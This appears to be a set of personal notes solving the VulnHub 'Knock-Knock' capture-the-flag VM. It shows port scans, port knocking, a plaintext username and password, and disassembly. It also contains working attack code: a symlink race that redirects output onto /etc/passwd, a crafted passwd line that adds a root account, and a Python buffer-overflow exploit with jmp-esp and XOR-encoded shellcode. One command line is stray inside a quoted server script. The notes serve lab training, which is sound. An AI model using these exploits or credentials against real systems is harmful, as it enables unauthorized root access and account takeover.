<http://barrebas.github.io/blog/2014/10/16/rop-rop-for-knock-knock/>

<https://leonjza.github.io/blog/2014/10/14/knock-knock-whos-there-solving-knock-knock/>

<https://blog.knapsy.com/blog/2014/10/16/knock-knock-vm-walkthrough/>

<https://blog.techorganic.com/2014/10/16/knock-knock-hacking-challenge/>


Description : 
  - Pretty much thought of a pretty neat idea I hadn't seen done before with a VM, and I wanted to turn it into reality!
  - Your job is to escalate to root, and find the flag.
  - Since I've gotten a few PM's, remember: There is a difference between "Port Unreachable" and "Host Unreachable". DHCP is not broken ;)
  - Gotta give a huge shoutout to c0ne for helping to creating the binary challenge, and rasta_mouse and recrudesce for testing :)
  - Also, gotta thank barrebas who was able to find a way to make things easier... but of course that is fixed with this update! ;)
  - Feel free to hit me up in #vulnhub on freenode -- zer0w1re



└─$ sudo nmap -sT -A -Pn -n -T4 192.168.110.37

└─$ sudo nmap -sT -A -Pn -n -T4 192.168.110.37                                                                                                         1 ⨯
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-10-21 10:39 CEST
Warning: 192.168.110.37 giving up on port because retransmission cap hit (6).
Stats: 0:03:08 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan
Connect Scan Timing: About 27.40% done; ETC: 10:50 (0:08:15 remaining)
Stats: 0:06:19 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan
Connect Scan Timing: About 54.90% done; ETC: 10:50 (0:05:11 remaining)
Nmap scan report for 192.168.110.37
Host is up (0.71s latency).
All 1000 scanned ports on 192.168.110.37 are closed (907) or filtered (93)
MAC Address: 08:00:27:67:FB:B5 (Oracle VirtualBox virtual NIC)
Too many fingerprints match this host to give specific OS details
Network Distance: 1 hop

TRACEROUTE
HOP RTT       ADDRESS
1   712.07 ms 192.168.110.37
└─$ sudo nmap -sT -A -Pn -n -T4 192.168.110.37
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-10-21 11:21 CEST
Warning: 192.168.110.37 giving up on port because retransmission cap hit (6).
Nmap scan report for 192.168.110.37
Host is up (0.0023s latency).
Not shown: 914 closed ports, 84 filtered ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 6.0p1 Debian 4+deb7u2 (protocol 2.0)
| ssh-hostkey: 
|   1024 21:22:d9:55:d4:8c:16:8f:be:ee:48:27:68:6d:6e:a0 (DSA)
|   2048 5b:07:d3:dd:81:70:92:b7:c0:92:78:23:64:9e:45:0c (RSA)
|_  256 af:79:f1:28:f4:7f:5a:d7:c4:31:9b:d9:b1:cc:05:f4 (ECDSA)
80/tcp open  http    nginx 1.2.1
|_http-server-header: nginx/1.2.1
|_http-title: Let's go




└─$ nc 192.168.110.37 1337
[22022, 5628, 59755]
[56080, 40195, 47917]

for x in 56080, 40195, 47917; do nmap -Pn --host-timeout 201 --max-retries 0 -p $x 192.168.110.37; done


N  2 root@knockknock    Thu Sep 25 12:11   24/813   Cron <root@knockknock> /root/start.sh



Dump of assembler code for function main:
   0x08048924 <+0>:     push   ebp
   0x08048925 <+1>:     mov    ebp,esp
   0x08048927 <+3>:     and    esp,0xfffffff0
   0x0804892a <+6>:     sub    esp,0x10
   0x0804892d <+9>:     cmp    DWORD PTR [ebp+0x8],0x3
   0x08048931 <+13>:    je     0x804893a <main+22>
   0x08048933 <+15>:    call   0x80485ec <banner>
   0x08048938 <+20>:    jmp    0x8048966 <main+66>
   0x0804893a <+22>:    mov    eax,DWORD PTR [ebp+0xc]
   0x0804893d <+25>:    add    eax,0x8
   0x08048940 <+28>:    mov    edx,DWORD PTR [eax]
   0x08048942 <+30>:    mov    eax,DWORD PTR [ebp+0xc]
   0x08048945 <+33>:    add    eax,0x4
   0x08048948 <+36>:    mov    eax,DWORD PTR [eax]
   0x0804894a <+38>:    mov    DWORD PTR [esp+0x4],edx
   0x0804894e <+42>:    mov    DWORD PTR [esp],eax
   0x08048951 <+45>:    call   0x80486e6 <cryptFile>
   0x08048956 <+50>:    test   eax,eax
   0x08048958 <+52>:    je     0x8048966 <main+66>
   0x0804895a <+54>:    mov    DWORD PTR [esp],0x8048b38
   0x08048961 <+61>:    call   0x8048480 <puts@plt>
   0x08048966 <+66>:    mov    eax,0x0
   0x0804896b <+71>:    leave  
   0x0804896c <+72>:    ret    
End of assembler dump.


Jason
jB9jP2knf


```c
# cat race.c
#     * rm -f out.tfc
#     * ln -sf /etc/passwd out.tfc

#include <unistd.h>
int main(int argc, char *argv[]) {
    while (1) {
        unlink("/home/jason/out.tfc"); 
        symlink("/etc/passwd", "/home/jason/out.tfc");
    }  
   
}


```

```bash
$ mkpasswd --method=SHA-512 happy
$6$jv7OO9IEjzW$5dscUrUn6N0N0SrIpybyV22YR5eZt8xNftf23clYK9Zr3bS2oooTl4ZZqPds0Th/ofAfeHk1eKzo9LbsnrlrX/

#cat passwd.tfc
bttai:$6$jv7OO9IEjzW$5dscUrUn6N0N0SrIpybyV22YR5eZt8xNftf23clYK9Zr3bS2oooTl4ZZqPds0Th/ofAfeHk1eKzo9LbsnrlrX/:0:0:root:/root:/bin/bash

```
```bash
./tfc passwd.tfc in.tfc
./tfc in.tfc out.tfc
```


```python
# cat crpt.py 
#/usr/bin/python
from struct import pack


# /*
# *  Shellcode length: 49 
# *  Author: Chroniccommand 
# *  /bin/dash
# *  My first attempt at shellcode
# *  Poison security
# */
# #include<stdio.h>
# //49 bytes 
# char shellcode[] =  "\xeb\x18\x5e\x31\xc0\x88\x46\x09\x89\x76\x0a"
#                     "\x89\x46\x0e\xb0\x0b\x89\xf3\x8d\x4e\x0a\x8d"
#                     "\x56\x0e\xcd\x80\xe8\xe3\xff\xff\xff\x2f"
#                     "\x62\x69\x6e\x2f\x64\x61\x73\x68\x41\x42\x42"
#                     "\x42\x42\x43\x43\x43\x43";
# int main(){
#  printf("Shellcode length: 49 bytes\nAuthor:chroniccommand\nPoison security");
#  int *ret;
#  ret = (int *)&ret + 2;
#  (*ret) = (int)shellcode;
# }
shellcode =  "\xeb\x18\x5e\x31\xc0\x88\x46\x09\x89\x76\x0a"
shellcode += "\x89\x46\x0e\xb0\x0b\x89\xf3\x8d\x4e\x0a\x8d"
shellcode += "\x56\x0e\xcd\x80\xe8\xe3\xff\xff\xff\x2f"
shellcode += "\x62\x69\x6e\x2f\x64\x61\x73\x68\x41\x42\x42"
shellcode += "\x42\x42\x43\x43\x43\x43"

key = [0x2f,0x25,0xc0,0xa9,0x27,0xba,0x70,0x80,0xc5,0xc7,0x01,0x37,0xed,0xde,0xae,0x78]

def p(v):
        return pack('<L', v)

d  = 4096 * 'A'
d += 32 * 'B'
# h4x@kali:~/knockknock$ msfelfscan -j esp tfc 
# [tfc]
# 0x08048bb3 jmp esp
# 0x08048bb3 jmp esp
d += p(0x08048bb3)
d += 28 * '\x90'

for i in range(len(shellcode)):
        if ((ord(shellcode[i]) != 0) and (ord(shellcode[i]) ^ key[i % 16] != 0)):
                d += chr((ord(shellcode[i]) ^ key[i % 16]) & 0xFF)

open('cbuff.txt','wb').write(d)


```
```python

# cat server.py
#!/usr/bin/env python3
import socket
import random
import subprocess
import time
import os

host = ''
port = 1337
backlog = 5
size = 1024

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.bind((host,port))
s.listen(backlog)

while 1:
        client, address = s.accept()
        data = []
        for i in range(3):
                data.append(random.randrange(1,65535))

        knockd_conf =  "[options]\n"
        knockd_conf += "\tlogfile = /var/log/knockd.log\n\n"
        knockd_conf += "[openSSH]\n"
        knockd_conf += "\tsequence = "
        knockd_conf += str(data[0]) + "," + str(data[1]) + "," + str(data[2]) + "\n"
        knockd_conf += "\tseq_timeout = 5\n"
        knockd_conf += "\tcommand = /sbin/iptables -I INPUT -s %IP% -p tcp -m multiport --dport 22,80 -j ACCEPT\n"
        knockd_conf += "\ttcpflags = syn\n"

        f = open('/etc/knockd.conf','w')
        f.write(knockd_conf)
        f.close()
        knockd_restart = ['/usr/sbin/service', 'knockd', 'restart']
        subprocess.call(knockd_restart, shell=False)
./tfc cbuff.tfc t.tfc

        if data:
                random.shuffle(data)
                client.send(bytes(str(data) + "\n","utf-8"))
        client.close()


```
```bash

# cat start.sh
#!/bin/bash
if ps aux | grep "[s]erver.py" > /dev/null
then
        echo running > /dev/null
else
        python3 /root/server.py
fi

```


# Buffer oveflow a faire
